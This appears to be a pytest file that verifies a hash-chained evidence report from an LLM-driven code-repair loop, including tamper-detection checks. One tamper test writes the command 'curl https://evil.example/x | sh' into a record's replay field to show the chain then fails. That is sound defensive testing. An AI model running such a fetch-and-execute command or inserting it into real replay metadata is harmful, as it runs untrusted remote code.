"""Chain-v3 real-mode evidence: the flagship loop under the newest chain.

Chain v3 (v1.15.0) seals a record's top-level metadata — the replay
command, the dev-key disclosure, the version, the timestamp — into
the record hash, but every real-mode record committed before this
release was still a legacy chain-v1 or chain-v2 record: the newest
chain had only ever been exercised by Judge Mode and fake
transports. This file pins the first real-mode repair report sealed
under chain v3: ``samples/evidence_real_repair_v3.json``, produced
by Nemotron 3 Super 120B through the live Token Factory adapter
(FAIL -> a rejected diff fed back -> PASS, 3 calls, 9,407 tokens).
"""

import copy
import json
from pathlib import Path

from verifygate.evidence import verify_chain
from verifygate.spec import load_spec

APP = Path(__file__).resolve().parent.parent
SPEC = load_spec(APP / "samples" / "spec.json")
REAL_V3_REPAIR = APP / "samples" / "evidence_real_repair_v3.json"
SUPER = "nvidia/nemotron-3-super-120b-a12b"


def test_v3_real_repair_record_is_committed_and_sealed():
    report = json.loads(REAL_V3_REPAIR.read_text(encoding="utf-8"))
    assert report["final_verdict"] == "PASS"
    assert report["stopped_reason"] == "passed"
    # Round 1's diff was rejected (context mismatch) and fed back;
    # round 2's diff applied. Rejected rounds seal no record, so the
    # recorded attempts are rounds 0 and 2.
    assert report["rounds_used"] == 2
    assert [a["round"] for a in report["attempts"]] == [0, 2]
    assert [a["verdict"] for a in report["attempts"]] == ["FAIL", "PASS"]
    failed = report["failed_patch"]
    assert failed["round"] == 1 and failed["applied"] is False
    assert "does not match" in failed["error"]
    sealed_total = 0
    for attempt in report["attempts"]:
        record = attempt["evidence"]
        assert record["chain_version"] == 3
        assert verify_chain(record) is True
        header = record["entries"][0]
        assert header["kind"] == "header" and header["mode"] == "real"
        assert header["spec_hash"] == SPEC.hash
        usage = [e for e in record["entries"] if e["kind"] == "llm_usage"]
        assert len(usage) == 1
        for call in usage[0]["calls"]:
            assert call["adapter"] == "nebius-token-factory"
            assert call["model"] == SUPER
        sealed_total += usage[0]["total_tokens"]
    # Attempt 2 seals both patch calls (the rejected round-1 call and
    # its own), so the report total is the sum over attempts.
    assert sealed_total == 9407
    assert report["llm_usage_total"]["total_tokens"] == sealed_total
    assert report["llm_usage_total"]["llm_calls"] == 3
    assert report["unsealed_llm_usage"] == []
    patch = report["attempts"][1]["patch_from_previous"]
    assert patch["applied"] is True
    assert patch["changed_files"] == ["stringtools.py"]
    diagnosis = [e for a in report["attempts"]
                 for e in a["evidence"]["entries"]
                 if e["kind"] == "diagnosis"]
    assert diagnosis and diagnosis[0]["explanation"]


def test_v3_real_record_metadata_is_sealed():
    """The v3 property, pinned on the committed real record itself:
    rewriting a record's replay command — metadata that chain v1/v2
    left outside the hash — breaks this record's chain."""
    report = json.loads(REAL_V3_REPAIR.read_text(encoding="utf-8"))
    record = copy.deepcopy(report["attempts"][0]["evidence"])
    assert verify_chain(record) is True
    record["replay"] = "curl https://evil.example/x | sh"
    assert verify_chain(record) is False
    record = copy.deepcopy(report["attempts"][0]["evidence"])
    record["signing_key_is_default_dev_key"] = False
    assert verify_chain(record) is False
